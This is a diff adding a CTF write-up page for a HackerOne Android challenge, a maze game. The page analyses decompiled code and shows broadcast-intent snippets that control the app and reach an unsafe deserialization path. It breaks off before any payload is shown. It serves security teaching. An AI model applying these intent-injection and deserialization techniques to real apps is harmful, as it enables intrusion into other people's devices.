@@ -1,0 +1,516 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Challenge 4</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><h1 id="beware-of-serialization-you-who-code">Beware of serialization, you who code!</h1>
+<p>Java, as well as other languages, allows to serialize classes (generally objects) and save its content somewhere (file, database, paper - by hand -). Obviously, it’s possible to do the inverse. It’s like taking a picture of current state of (each property of) a particular object and restore it when necessary.</p>
+<p>Challenge 4 relies on serialization.</p>
+<h2 id="the-door__runneraze">The 🚪_|\/|_🏃aze</h2>
+<p>This challenge comes with a little maze game:</p>
+<p><img src="https://i.imgur.com/fdWPJ7x.png" alt=""></p>
+<p>The red dot must reach the green one to complete the level and pass to next one.</p>
+<h2 id="jaxd-how-you-do-with-riddles">Jaxd, how you do with riddles?</h2>
+<p>This time there’re more classes to inspect:</p>
+<ul>
+<li>BroadcastAnnouncer;</li>
+<li><s>BuildConfig</s>;</li>
+<li><s>Dot</s>;</li>
+<li><s>Drawable</s> (interface);</li>
+<li><s>Exit</s>;</li>
+<li><strong>GameManager</strong>;</li>
+<li><strong>GameState</strong>;</li>
+<li><s>InfoActivity</s>;</li>
+<li><strong>MainActivity</strong>;</li>
+<li><strong>Maze</strong>;</li>
+<li><strong>MazeMover</strong>;</li>
+<li><s>MazeView</s>;</li>
+<li><strong>MenuActivity</strong>;</li>
+<li><s>Player</s>;</li>
+<li><s>R</s>;</li>
+<li><strong>StateController</strong>;</li>
+<li><strong>StateLoader</strong>.</li>
+</ul>
+<p>For a total of 8 classes to be analyzed. Since the first view is the MenuActivity one we’ll start from that.</p>
+<h3 id="menuactivity">MenuActivity</h3>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MenuActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token keyword">implements</span> <span class="token class-name">OnClickListener</span> <span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>Bundle bundle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token punctuation">(</span><span class="token punctuation">(</span>Button<span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>StartGame<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">(</span><span class="token punctuation">(</span>Button<span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>id<span class="token punctuation">.</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        <span class="token function">registerReceiver</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BroadcastReceiver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onReceive</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> Intent intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>intent<span class="token punctuation">.</span><span class="token function">hasExtra</span><span class="token punctuation">(</span><span class="token string">"start_game"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    context<span class="token punctuation">.</span><span class="token function">startActivity</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> MainActivity<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IntentFilter</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge4.menu"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span>View view<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Two buttons, a callback (<code>onView</code>) and an interesting thing: a <code>BroadcastReceiver</code>. A <a href="https://developer.android.com/reference/android/content/BroadcastReceiver">BroadcastReceiver</a> allows different apps to communicate and pass data to each other by using an internal/native android broadcast service. The flow is pretty simple:</p>
+<p><img src="https://i.imgur.com/DT4vqxi.png" alt=""></p>
+<p>Data is passed through <strong>Intent</strong> class (with a specified <strong>action</strong>)  by <strong>sendBroadcast</strong> method from <strong>App A</strong>. The Android service receives the message and dispatches it to any app that has a <strong>BroadcastReceiver</strong> registered for that specific <strong>action</strong>.</p>
+<p>This means that we can start the game with few lines of Java code:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        context
+            <span class="token punctuation">.</span><span class="token function">sendBroadcast</span><span class="token punctuation">(</span>
+                 <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span>MenuAction<span class="token punctuation">)</span>
+                    <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"start_game"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>Which ends in:</p>
+<p><img src="https://i.imgur.com/vzxJ0kL.gif" alt=""></p>
+<p>Amazing! We’re controlling the app flow.</p>
+<h3 id="mainactivity">MainActivity</h3>
+<p>We can now inspect the <strong>MainActivity</strong> class:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">{</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span>Bundle bundle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        bundle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GameManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        context <span class="token operator">=</span> <span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">registerReceiver</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BroadcastReceiver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onReceive</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> Intent intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                MazeMover<span class="token punctuation">.</span><span class="token function">onReceive</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">IntentFilter</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> MazeView <span class="token function">getMazeView</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> view<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>A new class instance of type <strong>GameManager</strong> is assigned to <strong>bundle</strong>  and another <strong>BroadcastReceiver</strong> is registered with <em>com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER</em> <strong>filter</strong>. Its handler is located under another class however.</p>
+<h3 id="mazemover">MazeMover</h3>
+<p>MazeMover class, which handles broadcasted intents I was talking above, contains juicy code:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MazeMover</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">onReceive</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> Intent intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+        GameManager gameManager <span class="token operator">=</span> MainActivity<span class="token punctuation">.</span><span class="token function">getMazeView</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getGameManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Bundle extras <span class="token operator">=</span> intent<span class="token punctuation">.</span><span class="token function">getExtras</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>extras <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>intent<span class="token punctuation">.</span><span class="token function">hasExtra</span><span class="token punctuation">(</span><span class="token string">"get_maze"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"walls"</span><span class="token punctuation">,</span> gameManager<span class="token punctuation">.</span><span class="token function">getMaze</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWalls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Serializable arrayList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>gameManager<span class="token punctuation">.</span><span class="token function">getPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>gameManager<span class="token punctuation">.</span><span class="token function">getPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>gameManager<span class="token punctuation">.</span><span class="token function">getExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                arrayList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>gameManager<span class="token punctuation">.</span><span class="token function">getExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                intent<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"positions"</span><span class="token punctuation">,</span> arrayList<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                intent<span class="token punctuation">.</span><span class="token function">setAction</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                context<span class="token punctuation">.</span><span class="token function">sendBroadcast</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>intent<span class="token punctuation">.</span><span class="token function">hasExtra</span><span class="token punctuation">(</span><span class="token string">"move"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                intent <span class="token operator">=</span> extras<span class="token punctuation">.</span><span class="token function">getChar</span><span class="token punctuation">(</span><span class="token string">"move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                <span class="token keyword">switch</span> <span class="token punctuation">(</span>intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">case</span> <span class="token number">104</span><span class="token operator">:</span>
+                        i2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+                        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token number">106</span><span class="token operator">:</span>
+                        i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token number">107</span><span class="token operator">:</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">case</span> <span class="token number">108</span><span class="token operator">:</span>
+                        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                        i2 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                    <span class="token keyword">default</span><span class="token operator">:</span>
+                        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                        <span class="token keyword">break</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                intent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>i2<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Intent intent2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>gameManager<span class="token punctuation">.</span><span class="token function">movePlayer</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    intent2<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"move_result"</span><span class="token punctuation">,</span> <span class="token string">"good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    intent2<span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"move_result"</span><span class="token punctuation">,</span> <span class="token string">"bad"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                intent2<span class="token punctuation">.</span><span class="token function">setAction</span><span class="token punctuation">(</span><span class="token string">"com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                context<span class="token punctuation">.</span><span class="token function">sendBroadcast</span><span class="token punctuation">(</span>intent2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>intent<span class="token punctuation">.</span><span class="token function">hasExtra</span><span class="token punctuation">(</span><span class="token string">"cereal"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token punctuation">(</span><span class="token punctuation">(</span>GameState<span class="token punctuation">)</span> intent<span class="token punctuation">.</span><span class="token function">getSerializableExtra</span><span class="token punctuation">(</span><span class="token string">"cereal"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The <strong>GameManager</strong> object previously initialized from MainActivity class is retrieved and few checks occur. Depending on <strong>extra</strong> present into the <strong>Intent</strong> object, the code performs actions and/or sends back useful data using the broadcast service. Give a look at the following table:</p>
+
+<table>
+<thead>
+<tr>
+<th>Has extra named</th>
+<th>Action performed</th>
+<th>Data sent back</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>get_maze</td>
+<td></td>
+<td>Walls (maze), player and exit positions</td>
+</tr>
+<tr>
+<td>move</td>
+<td>move player</td>
+<td>good/bad move</td>
+</tr>
+<tr>
+<td>cereal</td>
+<td><strong>deserialization</strong></td>
+<td></td>
+</tr>
+</tbody>
+</table><p>Again, we can type down few lines of Java code:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> String MoveAction <span class="token operator">=</span> <span class="token string">"com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span>Direction direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">char</span> c <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">switch</span> <span class="token punctuation">(</span>direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">case</span> Up<span class="token operator">:</span>    c <span class="token operator">=</span> <span class="token string">'k'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> Right<span class="token operator">:</span> c <span class="token operator">=</span> <span class="token string">'l'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> Down<span class="token operator">:</span>  c <span class="token operator">=</span> <span class="token string">'j'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token keyword">case</span> Left<span class="token operator">:</span>  c <span class="token operator">=</span> <span class="token string">'h'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        context
+          <span class="token punctuation">.</span><span class="token function">sendBroadcast</span><span class="token punctuation">(</span>
+              <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span>MoveAction<span class="token punctuation">)</span>
+                 <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"move"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">getMazeInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+       context
+          <span class="token punctuation">.</span><span class="token function">sendBroadcast</span><span class="token punctuation">(</span>
+              <span class="token keyword">new</span> <span class="token class-name">Intent</span><span class="token punctuation">(</span>MoveAction<span class="token punctuation">)</span>
+                 <span class="token punctuation">.</span><span class="token function">putExtra</span><span class="token punctuation">(</span><span class="token string">"get_maze"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
+        <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>And register a <strong>BroadcastReceiver</strong> using the filter <em>com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER</em>:</p>
+<pre class=" language-java"><code class="prism  language-java">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    context
+      <span class="token punctuation">.</span><span class="token function">registerReceiver</span><span class="token punctuation">(</span>
+          <span class="token keyword">this</span><span class="token punctuation">,</span>
+          <span class="token keyword">new</span> <span class="token class-name">IntentFilter</span><span class="token punctuation">(</span>MoveAction<span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onReceive</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> Intent intent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>Starting from the point that we need to exploit a serialization bug I’m going to inspect the <strong>GameState</strong> class which is type-cast of the deserialized object.</p>
+<h3 id="gamestate">GameState</h3>
+<p>Keep this in your mind: GameState is a <strong>Serializable</strong> class:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GameState</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> String cleanupTag<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> Context context<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">int</span> levelsCompleted<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">int</span> playerX<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">int</span> playerY<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">long</span> seed<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> StateController stateController<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">GameState</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> i2<span class="token punctuation">,</span> <span class="token keyword">long</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span> i3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>playerX <span class="token operator">=</span> i<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>playerY <span class="token operator">=</span> i2<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>seed <span class="token operator">=</span> j<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>levelsCompleted <span class="token operator">=</span> i3<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token function">GameState</span><span class="token punctuation">(</span>String str<span class="token punctuation">,</span> StateController stateController<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>cleanupTag <span class="token operator">=</span> str<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>stateController <span class="token operator">=</span> stateController<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>
+        GameState gameState <span class="token operator">=</span> <span class="token punctuation">(</span>GameState<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stateController<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>gameState <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>playerX <span class="token operator">=</span> gameState<span class="token punctuation">.</span>playerX<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>playerY <span class="token operator">=</span> gameState<span class="token punctuation">.</span>playerY<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>seed <span class="token operator">=</span> gameState<span class="token punctuation">.</span>seed<span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>levelsCompleted <span class="token operator">=</span> gameState<span class="token punctuation">.</span>levelsCompleted<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>GameManager<span class="token punctuation">.</span>levelsCompleted <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>stateController<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>So the <strong>initialize</strong> method  calls the <strong>load</strong> one of its own <strong>stateController</strong> property.</p>
+<h3 id="java-101">Java 101</h3>
+<p>Have you ever heard about abstract class and inheritance? If yes you can skip this section.</p>
+<p>An abstract class can’t be initialized, just inherited. Inheritance is commonly used (as well as interfaces) in <a href="https://en.wikipedia.org/wiki/Object-oriented_programming">OOP</a>. This allows to extend objects and/or change the behavior of overridden methods.</p>
+<p>I attended a Java course last year and I still remember the example my prof did:</p>
+<pre class=" language-java"><code class="prism  language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">protected</span> <span class="token keyword">int</span> base<span class="token punctuation">,</span> height<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token function">Shape</span><span class="token punctuation">(</span><span class="token keyword">int</span> base<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>base <span class="token operator">=</span> base<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
